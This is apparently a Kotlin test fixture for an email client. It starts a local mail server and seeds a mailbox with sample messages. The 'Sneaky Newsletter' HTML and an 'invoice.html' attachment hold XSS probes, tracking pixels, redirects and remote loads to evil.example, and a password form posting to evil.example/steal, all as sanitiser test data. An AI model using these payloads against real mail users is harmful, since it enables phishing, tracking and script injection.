package com.kayloh20.kyliemail.web

import com.icegreen.greenmail.util.GreenMail
import com.icegreen.greenmail.util.ServerSetup
import com.kayloh20.kyliemail.data.mail.ServerConfig
import java.util.Date
import java.util.Properties
import javax.activation.DataHandler
import javax.mail.Flags
import javax.mail.Message
import javax.mail.Session
import javax.mail.internet.InternetAddress
import javax.mail.internet.MimeBodyPart
import javax.mail.internet.MimeMessage
import javax.mail.internet.MimeMultipart
import javax.mail.util.ByteArrayDataSource

/** A local IMAP server holding a mailbox of sample messages, including some that try to misbehave. */
class TestMail(imapPort: Int = 0, smtpPort: Int = 0) : AutoCloseable {
    val email = "kylie@icloud.com"
    val password = "test"
    private val greenMail = GreenMail(arrayOf(ServerSetup(imapPort, "127.0.0.1", "imap"), ServerSetup(smtpPort, "127.0.0.1", "smtp")))
    private val session = Session.getInstance(Properties())

    init {
        greenMail.start()
    }

    val server: ServerConfig
        get() = ServerConfig("127.0.0.1", greenMail.imap.port, "127.0.0.1", greenMail.smtp.port, tls = false)

    private val user = greenMail.setUser(email, email, password)

    fun createFolder(name: String) {
        greenMail.managers.imapHostManager.createMailbox(user, name)
    }

    fun deliver(message: MimeMessage) = user.deliver(message)

    fun message(from: String, subject: String, sent: Date = Date(), build: MimeMessage.() -> Unit): MimeMessage =
        MimeMessage(session).apply {
            setFrom(InternetAddress(from))
            setRecipients(Message.RecipientType.TO, email)
            setSubject(subject, "UTF-8")
            sentDate = sent
            build()
            saveChanges()
        }

    /** A mailbox with one of each kind of message, oldest first. */
    fun seed() {
        createFolder("Receipts")
        val day = 24 * 60 * 60 * 1000L
        val start = System.currentTimeMillis() - 10 * day
        deliver(message("Mom <mom@example.org>", "Dinner Sunday?", Date(start)) {
            setText("Are you coming for dinner on Sunday? Here's the recipe: https://example.org/recipes/lasagna.\n\nLove, Mom")
        })
        deliver(message("Shop <orders@shop.example>", "Your order has shipped", Date(start + day)) {
            setContent(MimeMultipart("mixed").apply {
                addBodyPart(MimeBodyPart().apply {
                    setContent(MimeMultipart("related").apply {
                        addBodyPart(MimeBodyPart().apply {
                            setContent("<p>Thanks for your order!</p><p><img src=\"cid:logo@shop\" alt=\"Shop logo\"></p>", "text/html; charset=utf-8")
                        })
                        addBodyPart(MimeBodyPart().apply {
                            dataHandler = DataHandler(ByteArrayDataSource(PNG, "image/png"))
                            setHeader("Content-ID", "<logo@shop>")
                            disposition = MimeBodyPart.INLINE
                        })
                    })
                })
                addBodyPart(MimeBodyPart().apply {
                    dataHandler = DataHandler(ByteArrayDataSource("%PDF-1.4 receipt".toByteArray(), "application/pdf"))
                    fileName = "receipt.pdf"
                    disposition = MimeBodyPart.ATTACHMENT
                })
                addBodyPart(MimeBodyPart().apply {
                    dataHandler = DataHandler(ByteArrayDataSource("<script>alert(1)</script>".toByteArray(), "text/html"))
                    fileName = "invoice.html"
                    disposition = MimeBodyPart.ATTACHMENT
                })
            })
        })
        deliver(message("Sneaky Newsletter <news@tracker.example>", "You won't believe this deal", Date(start + 2 * day)) {
            setContent(SNEAKY_HTML, "text/html; charset=utf-8")
        })
        deliver(message("Madison <madison@example.org>", "Pep rally!!", Date(start + 3 * day)) {
            setText("Bring pom-poms 📣")
            setFlag(Flags.Flag.FLAGGED, true)
        })
    }

    override fun close() = greenMail.stop()

    companion object {
        /** A 1×1 PNG. */
        val PNG: ByteArray = java.util.Base64.getDecoder().decode(
            "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==",
        )

        val SNEAKY_HTML = """
            <html><head>
              <meta http-equiv="refresh" content="0;url=https://evil.example/">
              <base href="https://evil.example/">
              <link rel="stylesheet" href="https://evil.example/style.css">
              <style>@import url(https://evil.example/import.css); .hero { background: url('https://tracker.example/bg.png'); color: #333 }</style>
              <script>document.title = 'pwned'</script>
            </head><body onload="alert(1)">
              <h1 class="hero">Huge deal!</h1>
              <img src="https://tracker.example/open.gif?id=123" width="1" height="1">
              <img src="http://tracker.example/banner.png" alt="Banner">
              <p onclick="alert(2)" style="color: red">Click <a href="https://shop.example/deal" target="_self">here</a>
                 or <a href="javascript:alert(3)">here</a> or <a href="data:text/html,hi">here</a>.</p>
              <form action="https://evil.example/steal"><input name="password" type="password"><button>Log in</button></form>
              <iframe src="https://evil.example/frame"></iframe>
              <svg onload="alert(4)"><script>alert(5)</script></svg>
              <object data="https://evil.example/x.swf"></object>
              <table background="https://tracker.example/table.png"><tr><td>Table</td></tr></table>
              <div style="width: expression(alert(6))">Old IE trick</div>
            </body></html>
        """.trimIndent()
    }
}
